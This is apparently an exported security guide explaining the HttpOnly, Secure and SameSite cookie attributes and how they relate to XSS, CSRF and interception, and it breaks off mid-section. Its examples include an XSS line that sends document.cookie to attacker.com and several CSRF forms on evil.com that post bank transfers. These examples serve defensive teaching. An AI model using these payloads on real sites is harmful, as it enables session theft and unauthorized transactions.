id="2b2562ad-76f0-8051-a853-d8e94691179c" class="">Why Cookie Security Matters</h3></div><div style="display:contents" dir="auto"><p id="2b2562ad-76f0-80a2-8c08-ff35f1fa83bc" class="">Improperly configured cookies can lead to:<br/>- <strong>Session hijacking</strong>: Attackers stealing session tokens<br/>- <strong>Cross-Site Scripting (XSS)</strong>: Malicious scripts accessing sensitive cookies<br/>- <strong>Cross-Site Request Forgery (CSRF)</strong>: Unauthorized actions using user’s cookies<br/>- <strong>Man-in-the-Middle (MitM) attacks</strong>: Interception of cookies over insecure connections</p></div><div style="display:contents" dir="auto"><hr id="2b2562ad-76f0-8084-a137-c8f4758beebf"/></div><div style="display:contents" dir="auto"><h2 id="2b2562ad-76f0-80db-9932-db002bba0be3" class="">HttpOnly Attribute</h2></div><div style="display:contents" dir="auto"><h3 id="2b2562ad-76f0-8076-9409-f55fbf39d81b" class="">Definition</h3></div><div style="display:contents" dir="auto"><p id="2b2562ad-76f0-8084-ba62-d88fb1d05a84" class="">The <code>HttpOnly</code> attribute prevents client-side JavaScript from accessing the cookie through <code>document.cookie</code> or other DOM APIs. This attribute is crucial for protecting sensitive cookies from XSS attacks.</p></div><div style="display:contents" dir="auto"><h3 id="2b2562ad-76f0-8038-9202-e80155dcdb32" class="">⚠️ CRITICAL: HttpOnly Does NOT Protect Against CSRF</h3></div><div style="display:contents" dir="auto"><p id="2b2562ad-76f0-80e1-8d18-f3933ce260eb" class=""><strong>Important Clarification:</strong><br/>- ✅ HttpOnly <strong>protects against XSS</strong> (Cross-Site Scripting)<br/>- ❌ HttpOnly <strong>does NOT protect against CSRF</strong> (Cross-Site Request Forgery)</p></div><div style="display:contents" dir="auto"><p id="2b2562ad-76f0-80e4-94cf-ca2bcffa80d6" class="">These are two completely different attack vectors. See <code>CRITICAL_CLARIFICATION</code> below for detailed explanation.</p></div><div style="display:contents" dir="ltr"><figure id="2b2562ad-76f0-8053-94d7-c9672a5e1525" class="link-to-page"><a href="HttpOnly%20and%20Secure%20cookies/Critical%20Clarification%20HttpOnly%20vs%20CSRF%20Protection%202b2562ad76f0805394d7c9672a5e1525.html">Critical Clarification: HttpOnly vs CSRF Protection</a></figure></div><div style="display:contents" dir="auto"><h3 id="2b2562ad-76f0-80ad-98a2-d5fb44508a6a" class="">How It Works</h3></div><div style="display:contents" dir="auto"><p id="2b2562ad-76f0-80f1-b9f4-f5bebfd5053c" class="">When a cookie has the <code>HttpOnly</code> flag:<br/>- ✅ The cookie is sent with HTTP requests automatically<br/>- ✅ Server-side code can read and write the cookie<br/>- ❌ JavaScript cannot access the cookie via <code>document.cookie</code><br/>- ❌ Browser extensions cannot access the cookie (in most cases)</p></div><div style="display:contents" dir="auto"><h3 id="2b2562ad-76f0-8086-890b-ce0f9e16394a" class="">Syntax</h3></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b2562ad-76f0-8070-a286-dc5b2526fc2d" class="code code-wrap"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">Set-Cookie: sessionId=abc123; HttpOnly</code></pre></div><div style="display:contents" dir="auto"><h3 id="2b2562ad-76f0-80d8-8a18-ca3d866ad0e5" class="">Example: Without HttpOnly (Vulnerable to XSS)</h3></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b2562ad-76f0-80f7-a4ba-e89932924f46" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">// Server sets cookie without HttpOnlySet-Cookie: sessionId=abc123
// Attacker&#x27;s XSS script can steal the cookie&lt;script&gt;  fetch(&#x27;https://attacker.com/steal?cookie=&#x27; + document.cookie);&lt;/script&gt;</code></pre></div><div style="display:contents" dir="auto"><h3 id="2b2562ad-76f0-808c-a848-cbd4473d0548" class="">Example: With HttpOnly (Protected from XSS)</h3></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b2562ad-76f0-80db-87d2-e4fcb7358e2d" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">// Server sets cookie with HttpOnlySet-Cookie: sessionId=abc123; HttpOnly
// JavaScript cannot access itconsole.log(document.cookie); // Does not include sessionId// Result: &quot;&quot; (empty or other non-HttpOnly cookies)</code></pre></div><div style="display:contents" dir="auto"><h3 id="2b2562ad-76f0-808e-bea4-d53031886862" class="">Example: HttpOnly Does NOT Prevent CSRF</h3></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b2562ad-76f0-8084-84fc-cb5bc19109d7" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">// Cookie with HttpOnlySet-Cookie: sessionId=abc123; HttpOnly; Secure
// CSRF attack from evil.com:// User visits evil.com while logged into bank.com// evil.com submits form to bank.com/transferPOST https://bank.com/transfer HTTP/1.1Cookie: sessionId=abc123  // Browser STILL sends cookie automatically!// HttpOnly did NOT prevent this because:// - Browser automatically sends cookies with requests// - HttpOnly only prevents JavaScript access// - CSRF doesn&#x27;t need JavaScript to access the cookie</code></pre></div><div style="display:contents" dir="auto"><h3 id="2b2562ad-76f0-8001-90f2-d94bc634ed23" class="">When to Use HttpOnly</h3></div><div style="display:contents" dir="auto"><p id="2b2562ad-76f0-80e8-a8a0-db8db76b4c38" class=""><strong>Always use HttpOnly for:</strong><br/>- Session tokens<br/>- Authentication cookies<br/>- CSRF tokens (to prevent XSS from stealing them)<br/>- Any sensitive data stored in cookies</p></div><div style="display:contents" dir="auto"><p id="2b2562ad-76f0-80cd-9ae7-cc495d1925ac" class=""><strong>You can skip HttpOnly for:</strong><br/>- Client-side only cookies (e.g., UI preferences)<br/>- Cookies that need JavaScript access (use with caution)</p></div><div style="display:contents" dir="auto"><h3 id="2b2562ad-76f0-803f-a0ea-ead8b80f3fb0" class="">Limitations</h3></div><div style="display:contents" dir="auto"><ul id="2b2562ad-76f0-800b-8540-c6f95582fa81" class="bulleted-list"><li style="list-style-type:disc">Does not protect against CSRF attacks (use SameSite or CSRF tokens)</li></ul></div><div style="display:contents" dir="auto"><ul id="2b2562ad-76f0-807a-97b6-d0fd6acc0b91" class="bulleted-list"><li style="list-style-type:disc">Does not encrypt the cookie value</li></ul></div><div style="display:contents" dir="auto"><ul id="2b2562ad-76f0-80dd-bae5-efefd126c4a0" class="bulleted-list"><li style="list-style-type:disc">Does not prevent server-side vulnerabilities</li></ul></div><div style="display:contents" dir="auto"><ul id="2b2562ad-76f0-801f-9724-c1598f7e0ba4" class="bulleted-list"><li style="list-style-type:disc">Does not protect against browser extensions with elevated privileges</li></ul></div><div style="display:contents" dir="auto"><hr id="2b2562ad-76f0-8045-9fef-eaae5d882809"/></div><div style="display:contents" dir="auto"><h2 id="2b2562ad-76f0-80ac-b3f3-c1fde6d10898" class="">Secure Attribute</h2></div><div style="display:contents" dir="auto"><h3 id="2b2562ad-76f0-806d-895e-c384e36927dc" class="">Definition</h3></div><div style="display:contents" dir="auto"><p id="2b2562ad-76f0-80f7-a7df-c85677c9c73c" class="">The <code>Secure</code> attribute ensures cookies are only transmitted over HTTPS connections. Browsers will refuse to send <code>Secure</code> cookies over unencrypted HTTP connections.</p></div><div style="display:contents" dir="auto"><h3 id="2b2562ad-76f0-805f-ad1b-d572c5aec22c" class="">How It Works</h3></div><div style="display:contents" dir="auto"><p id="2b2562ad-76f0-800a-ad80-dbc0b599d299" class="">When a cookie has the <code>Secure</code> flag:<br/>- ✅ Cookie is sent only over HTTPS<br/>- ✅ Cookie is sent only over secure WebSocket connections (wss://)<br/>- ❌ Cookie is NOT sent over HTTP<br/>- ❌ Cookie is NOT sent over insecure WebSocket connections (ws://)</p></div><div style="display:contents" dir="auto"><h3 id="2b2562ad-76f0-80a4-a29b-cf7985d05a7d" class="">Syntax</h3></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b2562ad-76f0-80c0-8168-e245dd93e78e" class="code code-wrap"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">Set-Cookie: sessionId=abc123; Secure</code></pre></div><div style="display:contents" dir="auto"><h3 id="2b2562ad-76f0-801b-b4fa-c25e417e3efe" class="">Example: Without Secure (Vulnerable)</h3></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b2562ad-76f0-809c-a20b-fb0f64381914" class="code code-wrap"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">// User on HTTP connection
GET http://example.com/dashboard HTTP/1.1
Cookie: sessionId=abc123  // Sent in plaintext, can be intercepted</code></pre></div><div style="display:contents" dir="auto"><h3 id="2b2562ad-76f0-8000-b1e3-dac703937668" class="">Example: With Secure (Protected)</h3></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b2562ad-76f0-8029-8647-f480553bef5f" class="code code-wrap"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">// User on HTTP connection
GET http://example.com/dashboard HTTP/1.1
Cookie: (sessionId not sent)  // Browser refuses to send Secure cookie

// User on HTTPS connection
GET https://example.com/dashboard HTTP/1.1
Cookie: sessionId=abc123  // Sent over encrypted connection</code></pre></div><div style="display:contents" dir="auto"><h3 id="2b2562ad-76f0-8025-93ff-cfe7dc881cc0" class="">When to Use Secure</h3></div><div style="display:contents" dir="auto"><p id="2b2562ad-76f0-80e6-93c2-e88c50fdabe7" class=""><strong>Always use Secure for:</strong><br/>- All cookies containing sensitive data<br/>- Session cookies<br/>- Authentication tokens<br/>- Any cookie in production environments<br/>- Cookies with <code>SameSite=None</code> (required by modern browsers)</p></div><div style="display:contents" dir="auto"><p id="2b2562ad-76f0-802e-ac9d-e6187b1a159d" class=""><strong>Exception:</strong><br/>- Development environments using HTTP (but use HTTPS in production)</p></div><div style="display:contents" dir="auto"><h3 id="2b2562ad-76f0-80ce-8689-d32b73480357" class="">Important Notes</h3></div><div style="display:contents" dir="auto"><ul id="2b2562ad-76f0-809e-87ce-f7b51634cb28" class="bulleted-list"><li style="list-style-type:disc"><code>Secure</code> does NOT encrypt the cookie value itself</li></ul></div><div style="display:contents" dir="auto"><ul id="2b2562ad-76f0-80f7-8d29-ddbf723e0191" class="bulleted-list"><li style="list-style-type:disc"><code>Secure</code> relies on HTTPS/TLS for encryption</li></ul></div><div style="display:contents" dir="auto"><ul id="2b2562ad-76f0-8069-90ef-c3b90d771df1" class="bulleted-list"><li style="list-style-type:disc">Cookies without <code>Secure</code> can be intercepted over HTTP</li></ul></div><div style="display:contents" dir="auto"><ul id="2b2562ad-76f0-80ed-b022-c3a498f4033e" class="bulleted-list"><li style="list-style-type:disc">Modern browsers require <code>Secure</code> for <code>SameSite=None</code> cookies</li></ul></div><div style="display:contents" dir="auto"><h3 id="2b2562ad-76f0-807e-a999-f62e55fdfaf6" class="">Browser Behavior</h3></div><div style="display:contents" dir="auto"><ul id="2b2562ad-76f0-80ba-8579-f4bea1602ebf" class="bulleted-list"><li style="list-style-type:disc"><strong>Chrome/Edge</strong>: Requires <code>Secure</code> for <code>SameSite=None</code> cookies</li></ul></div><div style="display:contents" dir="auto"><ul id="2b2562ad-76f0-80d4-85e0-cd40ea527bc4" class="bulleted-list"><li style="list-style-type:disc"><strong>Firefox</strong>: Requires <code>Secure</code> for <code>SameSite=None</code> cookies</li></ul></div><div style="display:contents" dir="auto"><ul id="2b2562ad-76f0-8096-a308-ddb48cf9c043" class="bulleted-list"><li style="list-style-type:disc"><strong>Safari</strong>: Requires <code>Secure</code> for <code>SameSite=None</code> cookies</li></ul></div><div style="display:contents" dir="auto"><ul id="2b2562ad-76f0-803d-8382-de87ed317928" class="bulleted-list"><li style="list-style-type:disc"><strong>All browsers</strong>: Will not send <code>Secure</code> cookies over HTTP</li></ul></div><div style="display:contents" dir="auto"><hr id="2b2562ad-76f0-806c-979d-e706dade5183"/></div><div style="display:contents" dir="auto"><h2 id="2b2562ad-76f0-80c6-a17c-c0fcaa95965a" class="">SameSite Attribute</h2></div><div style="display:contents" dir="auto"><h3 id="2b2562ad-76f0-8029-b151-fd8cb02ede51" class="">Definition</h3></div><div style="display:contents" dir="auto"><p id="2b2562ad-76f0-8020-afc1-c4a194dc04e4" class="">The <code>SameSite</code> attribute controls whether cookies are sent with cross-site requests, providing protection against CSRF attacks. It’s one of the most important modern cookie security features.</p></div><div style="display:contents" dir="auto"><h3 id="2b2562ad-76f0-80fb-b1a6-dae7739e2beb" class="">⚠️ This is What Actually Protects Against CSRF</h3></div><div style="display:contents" dir="auto"><p id="2b2562ad-76f0-80c3-9bd8-d1dd3ebf470e" class="">Unlike HttpOnly, the <code>SameSite</code> attribute <strong>does protect against CSRF attacks</strong> by controlling when cookies are sent with requests.</p></div><div style="display:contents" dir="auto"><h3 id="2b2562ad-76f0-8043-94dd-cff1c6dc9b92" class="">Values</h3></div><div style="display:contents" dir="auto"><h3 id="2b2562ad-76f0-8070-9671-ce0834933125" class="">1. SameSite=Strict</h3></div><div style="display:contents" dir="auto"><p id="2b2562ad-76f0-8000-82c1-fc76599e8c73" class=""><strong>Behavior:</strong><br/>- Cookie is sent ONLY with same-site requests<br/>- Cookie is NOT sent with any cross-site requests, including top-level navigations<br/>- Maximum CSRF protection</p></div><div style="display:contents" dir="auto"><p id="2b2562ad-76f0-80d0-8e02-f7d1592c4358" class=""><strong>Use Cases:</strong><br/>- Banking applications<br/>- Administrative panels<br/>- High-security applications<br/>- When user experience allows for re-authentication</p></div><div style="display:contents" dir="auto"><p id="2b2562ad-76f0-805c-81f4-c029453b289c" class=""><strong>Example:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b2562ad-76f0-803a-8832-c81659a8ade1" class="code code-wrap"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">Set-Cookie: sessionId=abc123; SameSite=Strict; Secure; HttpOnly</code></pre></div><div style="display:contents" dir="auto"><p id="2b2562ad-76f0-8007-8417-c7d5ee135e2e" class=""><strong>Scenario:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b2562ad-76f0-80bc-bb9c-e62cd35eb3f3" class="code code-wrap"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">User clicks link from email: https://bank.com/transfer?to=attacker&amp;amount=1000
Browser sends request WITHOUT cookie (cross-site navigation)
User must log in again (better security, but may impact UX)</code></pre></div><div style="display:contents" dir="auto"><h3 id="2b2562ad-76f0-80b5-b5cd-c6cb4373099a" class="">2. SameSite=Lax (Default in Modern Browsers)</h3></div><div style="display:contents" dir="auto"><p id="2b2562ad-76f0-809a-8b56-fc1f559747a6" class=""><strong>Behavior:</strong><br/>- Cookie is sent with same-site requests<br/>- Cookie is sent with top-level GET navigations (e.g., clicking a link)<br/>- Cookie is NOT sent with cross-site POST requests, iframes, images, or AJAX calls<br/>- Good balance between security and usability</p></div><div style="display:contents" dir="auto"><p id="2b2562ad-76f0-8003-8c8a-e70ed0b972d8" class=""><strong>Use Cases:</strong><br/>- Most web applications (recommended default)<br/>- E-commerce sites<br/>- Social media platforms<br/>- When you want CSRF protection without breaking external links</p></div><div style="display:contents" dir="auto"><p id="2b2562ad-76f0-80c8-9414-cda33cd9297c" class=""><strong>Example:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b2562ad-76f0-80f5-86c1-dc0b824a99ff" class="code code-wrap"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">Set-Cookie: sessionId=abc123; SameSite=Lax; Secure; HttpOnly</code></pre></div><div style="display:contents" dir="auto"><p id="2b2562ad-76f0-80ad-9dcc-dd825850b3a0" class=""><strong>Scenario:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b2562ad-76f0-80b0-bff5-e0f279e00b49" class="code code-wrap"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">User clicks link from email: https://shop.com/product/123
Browser sends request WITH cookie (top-level navigation, GET request)
User stays logged in (good UX)

Attacker&#x27;s form on evil.com:
&lt;form action=&quot;https://shop.com/transfer&quot; method=&quot;POST&quot;&gt;
  &lt;input name=&quot;amount&quot; value=&quot;1000&quot;&gt;
&lt;/form&gt;
Browser sends request WITHOUT cookie (cross-site POST)
CSRF attack prevented</code></pre></div><div style="display:contents" dir="auto"><h3 id="2b2562ad-76f0-80eb-ae3f-fdf75c448604" class="">3. SameSite=None</h3></div><div style="display:contents" dir="auto"><p id="2b2562ad-76f0-8025-92a5-ef2d8455ec7f" class=""><strong>Behavior:</strong><br/>- Cookie is sent with both same-site and cross-site requests<br/>- <strong>REQUIRES</strong> the <code>Secure</code> attribute<br/>- Used for third-party integrations</p></div><div style="display:contents" dir="auto"><p id="2b2562ad-76f0-808e-bf91-e5de4fa5d37f" class=""><strong>Use Cases:</strong><br/>- Embedded widgets (e.g., payment processors)<br/>- OAuth flows<br/>- Cross-origin API calls<br/>- Third-party authentication</p></div><div style="display:contents" dir="auto"><p id="2b2562ad-76f0-807a-8efc-cbf3a6d71d66" class=""><strong>Example:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b2562ad-76f0-809a-9cfd-ec91804580b1" class="code code-wrap"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">Set-Cookie: sessionId=abc123; SameSite=None; Secure; HttpOnly</code></pre></div><div style="display:contents" dir="auto"><p id="2b2562ad-76f0-80ab-99bb-f29b1237be57" class=""><strong>Important:</strong><br/>- Must be used with <code>Secure</code> attribute<br/>- Some browsers block third-party cookies by default<br/>- Consider alternatives like OAuth2 or token-based auth</p></div><div style="display:contents" dir="auto"><h3 id="2b2562ad-76f0-803d-811a-c78e4b1d7150" class="">SameSite Default Behavior</h3></div><div style="display:contents" dir="auto"><p id="2b2562ad-76f0-8009-af79-e6c8094d0864" class=""><strong>Modern Browsers (2020+):</strong><br/>- Chrome 80+, Edge 80+, Firefox 69+, Safari 13+<br/>- Default to <code>SameSite=Lax</code> if not specified<br/>- Legacy behavior was <code>SameSite=None</code></p></div><div style="display:contents" dir="auto"><p id="2b2562ad-76f0-808c-9143-c907a461ec22" class=""><strong>Legacy Browsers:</strong><br/>- Treat missing <code>SameSite</code> as <code>None</code><br/>- May send cookies with all requests</p></div><div style="display:contents" dir="auto"><p id="2b2562ad-76f0-8078-9451-f099ba5fe614" class=""><strong>Best Practice:</strong><br/>Always explicitly set <code>SameSite</code> to avoid relying on browser defaults.</p></div><div style="display:contents" dir="auto"><h3 id="2b2562ad-76f0-80f1-b303-cf6d82770114" class="">SameSite and CSRF Protection</h3></div><div style="display:contents" dir="auto"><p id="2b2562ad-76f0-80c6-99ea-ec07ca42aa30" class=""><strong>How SameSite Prevents CSRF:</strong></p></div><div style="display:contents" dir="auto"><ol type="1" id="2b2562ad-76f0-80e0-8cf1-d9f331f5dd29" class="numbered-list" start="1"><li><strong>Strict Mode:</strong><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b2562ad-76f0-8061-b078-e0dcf3d5dc91" class="code code-wrap"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">Attacker&#x27;s site: evil.com
Target site: bank.com

User visits evil.com, which contains:
&lt;form action=&quot;https://bank.com/transfer&quot; method=&quot;POST&quot;&gt;
  &lt;input name=&quot;to&quot; value=&quot;attacker&quot;&gt;
  &lt;input name=&quot;amount&quot; value=&quot;10000&quot;&gt;
&lt;/form&gt;

Browser sends request WITHOUT cookie (cross-site POST)
Attack fails</code></pre></div></li></ol></div><div style="display:contents" dir="auto"><ol type="1" id="2b2562ad-76f0-80a8-91d1-c6e550bc56dd" class="numbered-list" start="2"><li><strong>Lax Mode:</strong><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b2562ad-76f0-8049-8c53-e444d70c0cb0" class="code code-wrap"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">Same scenario as above - cookie not sent with POST
